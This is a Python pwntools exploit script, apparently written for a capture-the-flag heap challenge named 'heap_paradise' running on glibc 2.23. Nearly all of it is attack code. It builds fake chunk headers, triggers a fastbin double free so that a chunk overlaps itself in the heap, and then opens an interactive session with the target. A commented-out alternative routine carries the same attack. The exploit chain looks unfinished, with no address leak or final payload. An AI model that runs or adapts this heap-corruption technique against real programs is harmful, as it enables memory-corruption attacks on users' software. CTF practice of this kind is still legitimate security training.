#!/usr/bin/env python3
from pwn import *

PAD = lambda n: b"a" * n
DUMMY = 0xdeadbeefdeadbeef
QWORD = 8
CHUNK_HDR = QWORD * 2

ld = ELF("ld-2.23.so")
elf = ELF("./heap_paradise_patched")
libc = ELF("./given/libc_64.so.6")

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"heap_paradise_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        log.info(f"pie base: {hex(pie_base)}")
        log.info(f"metadata[0xf]: {hex(pie_base + 0x202040)}")
        gdb.attach(p, "\n".join([
            #f"b *{hex(pie_base + 0xdc6)}", # b4 free
            f"b *{hex(pie_base + 0xe26)}", # main's exit
        ]))

class FakeChunk:
    def __init__(self, size, prev_size=0, fwd=0, bck=0, nxt_fwd=0, nxt_bck=0):
        self.prev_size = prev_size
        self.size = size
        self.fwd = fwd
        self.bck = bck
        self.nxt_fwd = nxt_fwd
        self.nxt_bck = nxt_bck

    def dump_header(self, A=0, M=0, P=0):
        return p64(self.prev_size) + p64(self.size | P)

    def dump_allocated(self, A=0, M=0, P=0):
        return self.dump_header(A=A, M=M, P=P).ljust(self.size, b"\x00")


num_data = 0
def alloc_data(size, data):
    assert(len(data) <= size)
    global num_data
    p.sendlineafter(b"You Choice:", b"1")
    p.sendlineafter(b"Size :", str(size).encode())
    p.sendafter(b"Data :", data)
    idx = num_data
    num_data += 1
    return idx

def free_data(index):
    p.sendlineafter(b"You Choice:", b"2")
    p.sendlineafter(b"Index :", str(index).encode())

def fastbin_dup_into_heap():
    # Parameters
    fastbin_chunk_size = 0x70
    unsortedbin_chunk_size = 0xa0
    victim_offset = 0x10

    req_size = fastbin_chunk_size - 0x10
    log.info(f"Going to request {hex(req_size)} size")
    # parameter offset
    # Original heap:        | a_hdr | -------- req_size -------- | b_hdr | ----- req_size --------- |
    #  we want to make it:          | offset | fake_chunk0(unsortedbin_size) |    fake_chunk1  |
    #                                        | fake0 hdr| ...        |offset2|fake1 hdr|..
    payload = PAD(victim_offset) + FakeChunk(size=unsortedbin_chunk_size).dump_header(P=1)
    a = alloc_data(req_size, payload)

    offset2 = (victim_offset + unsortedbin_chunk_size) - (req_size + CHUNK_HDR)
    payload = PAD(offset2) + FakeChunk(size=0x20).dump_allocated(P=1)
    b = alloc_data(req_size, payload)

    free_data(a)
    free_data(b)
    free_data(a)

    alloc_data(req_size, p8(CHUNK_HDR + victim_offset))
    alloc_data(req_size, p64(DUMMY))
    alloc_data(req_size, p64(DUMMY))
    # this should be chunk "a" + 0x30
    #unsortedbin_chunk = alloc_data(req_size, b"ping-jui")


def hackmd():
    alloc_data(0x68, p64(0) * 3 + p64(0x71))
    alloc_data(0x68, p64(0) * 3 + p64(0x21) + p64(0) * 5 + p64(0x21))
    free_data(0)
    free_data(1)
    free_data(0)

    alloc_data(0x68, b"\x20")
    alloc_data(0x68, b"B")
    alloc_data(0x68, b"C")
    #alloc_data(0x68, b"D")


def exploit():
    fastbin_dup_into_heap()
    #hackmd()
    p.sendlineafter(b"You Choice:", b"3")
    p.interactive()

if __name__ == "__main__":
    exploit()
